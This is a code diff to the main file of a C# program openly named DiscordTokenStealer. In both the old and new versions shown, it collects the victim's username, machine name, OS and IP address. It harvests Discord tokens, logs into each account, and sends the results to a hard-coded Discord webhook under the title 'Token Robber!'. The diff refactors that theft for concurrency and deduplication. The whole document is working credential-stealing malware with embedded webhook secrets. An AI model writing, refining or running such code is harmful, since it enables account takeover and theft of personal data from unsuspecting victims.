@@ -1,23 +1,36 @@
-﻿using System.Text;
+﻿using System.Collections.Concurrent;
+using Cysharp.Text;
 using DiscordTokenStealer;
 using DiscordTokenStealer.Discord;
 
-StringBuilder content = new StringBuilder()
-    .AppendLine($"Username: {Environment.UserName}")
-    .AppendLine($"Machine Name: {Environment.MachineName}")
-    .AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})")
-    .AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}")
-    .AppendLine("Token(s): ");
-await Parallel.ForEachAsync(TokenParser.Parse(), async (token, cts) => await AppendDiscordUserSummary(token, cts));
-using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C");
-await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
+using var content = ZString.CreateUtf8StringBuilder();
+content.AppendLine($"Username: {Environment.UserName}");
+content.AppendLine($"Machine Name: {Environment.MachineName}");
+content.AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})");
+content.AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}");
+content.AppendLine("Token(s): ");
 
-async Task AppendDiscordUserSummary(string userToken, CancellationToken cts = default)
+var semaphore = new SemaphoreSlim(1, 1);
+var loggedUsers = new ConcurrentBag<string>();
+
+using (var discordClient = new DiscordClient())
 {
-    DiscordClient client = new DiscordClient(userToken);
-    string? summary = await client.GetUserSummary(cts);
-    lock (content)
+    await foreach (var token in TokenParser.ParseAsync())
     {
-        content.Append(summary);
+        await semaphore.WaitAsync();
+        try
+        {
+            if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id)) 
+                continue;
+            content.Append(discordUser);
+            loggedUsers.Add(discordUser.Id);
+        }
+        finally
+        {
+            semaphore.Release();
+        }
     }
 }
+
+using var webhook = new DiscordWebhookClient("947227745136570409", "W-f1csQP6qyaHN9M4imQegmqaEe3hT-a0Bd508TCSvdpgMblpmXyU8vlVUfQpfiBL_2S");
+await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
